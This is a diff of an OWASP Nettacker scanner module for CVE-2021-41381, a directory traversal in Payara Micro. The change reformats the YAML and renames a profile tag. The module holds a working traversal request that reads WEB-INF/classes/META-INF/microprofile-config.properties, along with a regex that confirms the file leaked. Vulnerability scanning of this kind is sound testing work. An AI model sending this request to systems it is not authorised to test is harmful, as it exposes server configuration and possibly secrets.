@@ -3,44 +3,41 @@ info:
   author: OWASP Nettacker Team
   severity: 5
   description: Payara Micro Community 5.2021.6 and below allows Directory Traversal
-  reference: 
-    - https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-054.txt
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-41381
+  reference:
+  - https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-054.txt
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-41381
   profiles:
-    - vuln
-    - http
-    - medium_severity
-    - cve2021
-    - cve
-    - payara
-    - lfi
-
+  - vuln
+  - http
+  - medium_severity
+  - payara
+  - lfi
+  - cve_2021
 payloads:
-  - library: http
-    steps:
-      - method: get
-        timeout: 3
-        headers:
-          User-Agent: "{user_agent}"
-        allow_redirects: false
-        ssl: false
-        url:
-          nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/.//WEB-INF/classes/META-INF/microprofile-config.properties"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-        
-        response:
-          condition_type: and
-          conditions:
-            content:
-              regex: payara.security.openid.default.providerURI=&payara.security.openid.sessionScopedConfiguration=true
-              reverse: false
+- library: http
+  steps:
+  - method: get
+    timeout: 3
+    headers:
+      User-Agent: '{user_agent}'
+    allow_redirects: false
+    ssl: false
+    url:
+      nettacker_fuzzer:
+        input_format: '{{schema}}://{target}:{{ports}}/.//WEB-INF/classes/META-INF/microprofile-config.properties'
+        prefix: ''
+        suffix: ''
+        interceptors: null
+        data:
+          schema:
+          - http
+          - https
+          ports:
+          - 80
+          - 443
+    response:
+      condition_type: and
+      conditions:
+        content:
+          regex: payara.security.openid.default.providerURI=&payara.security.openid.sessionScopedConfiguration=true
+          reverse: false
